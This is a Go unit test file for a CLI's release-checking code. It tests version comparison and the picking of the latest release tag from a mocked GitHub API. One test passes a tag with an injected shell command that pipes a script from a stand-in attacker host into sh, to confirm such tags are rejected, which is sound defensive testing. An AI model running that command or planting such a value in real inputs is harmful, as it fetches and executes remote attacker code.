// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 CYFR Works Inc.

package release

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"os"
	"testing"
)

func TestIsNewer(t *testing.T) {
	cases := []struct {
		latest, current string
		want            bool
	}{
		{"0.5.4", "0.5.3", true},
		{"0.5.3", "0.5.3", false},
		{"0.5.3", "0.5.4", false},
		{"1.0.0", "0.9.9", true},
		{"0.6.0", "0.5.9", true},
		{"0.5.10", "0.5.9", true},                // numeric, not lexical, compare
		{"prefix-0.5.4", "0.5.3", false},         // a prefix is no release version
		{"0.5.4", "dev", false},                  // unreleased current -> no notice
		{"dev", "0.5.3", false},                  // unparseable latest -> no notice
		{"0.5.4-rc1", "0.5.3", true},             // a later line's pre-release
		{"0.6.0", "0.6.0-alpha.1", true},         // the release after its pre-release
		{"0.6.0-alpha.1", "0.6.0", false},        // a pre-release before its release
		{"0.6.0-alpha.2", "0.6.0-alpha.1", true}, // pre-releases in order
		{"0.5", "0.5.3", false},                  // not three parts -> no notice
		{"", "0.5.3", false},
	}
	for _, c := range cases {
		if got := IsNewer(c.latest, c.current); got != c.want {
			t.Errorf("IsNewer(%q, %q) = %v, want %v", c.latest, c.current, got, c.want)
		}
	}
}

// withAPIURL points apiURL at a test server for the duration of the test.
func withAPIURL(t *testing.T, body string, status int) {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if status != http.StatusOK {
			w.WriteHeader(status)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(body))
	}))
	old := apiURL
	apiURL = srv.URL
	t.Cleanup(func() {
		apiURL = old
		srv.Close()
	})
}

func TestLatestNon200(t *testing.T) {
	withAPIURL(t, "", http.StatusForbidden)

	if _, err := Latest(context.Background()); err == nil {
		t.Error("Latest should return an error on a non-200 response")
	}
}

// `cyfr update` names release URLs and file names from the tag, so a tag
// that is no release version must never be selected.
func TestLatestRejectsShellMetacharacters(t *testing.T) {
	withAPIURL(t, `[
		{"tag_name": "0;curl evil.example|sh;#"},
		{"tag_name": "0.5.4-rc1"},
		{"tag_name": "0.5.4 "},
		{"tag_name": "0.5.4"}
	]`, http.StatusOK)

	got, err := Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest returned error: %v", err)
	}
	if got != "0.5.4" {
		t.Errorf("Latest = %q, want %q", got, "0.5.4")
	}
}

// selectionCase is one of tests/fixtures/release_manifest.json's selection
// rows: a listing as the GitHub releases API answers it, and the release
// taken from it, null for none.
type selectionCase struct {
	Name     string          `json:"name"`
	Releases json.RawMessage `json:"releases"`
	Picks    *string         `json:"picks"`
}

// Latest takes from each listing the release the shared selection rows
// name, and answers ErrNoRelease where they name none.
func TestLatestFollowsTheSelectionRows(t *testing.T) {
	raw, err := os.ReadFile(fixturePath)
	if err != nil {
		t.Fatal(err)
	}
	var vectors struct {
		Selection []selectionCase `json:"selection"`
	}
	if err := json.Unmarshal(raw, &vectors); err != nil {
		t.Fatal(err)
	}
	if len(vectors.Selection) == 0 {
		t.Fatal("the vector file has no selection rows")
	}
	for _, c := range vectors.Selection {
		withAPIURL(t, string(c.Releases), http.StatusOK)
		got, err := Latest(context.Background())
		switch {
		case c.Picks == nil && !errors.Is(err, ErrNoRelease):
			t.Errorf("%s: Latest = %q, %v; want ErrNoRelease", c.Name, got, err)
		case c.Picks != nil && (err != nil || got != *c.Picks):
			t.Errorf("%s: Latest = %q, %v; want %q", c.Name, got, err, *c.Picks)
		}
	}
}
